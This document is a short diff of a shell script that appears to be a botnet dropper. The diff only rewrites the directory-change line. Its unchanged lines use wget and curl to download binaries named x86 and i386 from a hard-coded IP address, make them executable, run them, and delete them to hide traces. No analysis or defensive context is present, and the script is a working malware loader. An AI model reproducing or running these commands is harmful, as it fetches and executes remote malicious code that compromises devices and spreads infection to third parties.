@@ -1,6 +1,5 @@
 #!/bin/sh
-cd /tmp || cd /var/run || cd /mntsh
-cd /tmp || cd /root
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
 wget http://91.92.42.125/x86 -O x86; chmod +x x86; ./x86; rm -f x86
 curl -O http://91.92.42.125/x86; chmod +x x86; ./x86; rm -f x86
 wget http://91.92.42.125/i386 -O i386; chmod +x i386; ./i386; rm -f i386
